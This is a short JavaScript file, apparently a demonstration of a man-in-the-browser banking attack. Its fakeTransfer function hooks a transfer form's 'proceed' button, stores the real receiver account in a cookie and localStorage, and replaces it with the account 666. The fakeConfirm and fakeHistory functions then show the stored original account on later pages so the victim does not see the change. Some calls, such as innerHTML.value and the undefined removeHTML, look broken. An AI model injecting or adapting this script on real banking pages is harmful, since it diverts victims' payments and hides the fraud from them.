console.log("run")


function fakeTransfer(){
	console.log("fakeTransfer")
	var button = document.getElementById('proceed');
	var field = document.getElementsByName("receiver");
	button.onclick = function(){
		originalValue = field[0].value;
		document.cookie = field[0].value;
		console.log("cookie: ",document.cookie);
		field[0].value=666;	
		localStorage.setItem(document.getElementById('transferText').innerHTML.value.concat(document.getElementById('amount').innerHTML.value), document.cookie);
		removeHTML();
		console.log("original: ",originalValue ,  "new: ",field[0].value);	
	}
};

function fakeConfirm(){	
	var field = document.getElementById("account");
	field.innerHTML=document.cookie;
};

function fakeHistory(){
	var field = document.getElementById("account");
	field.innerHTML=document.cookie;
};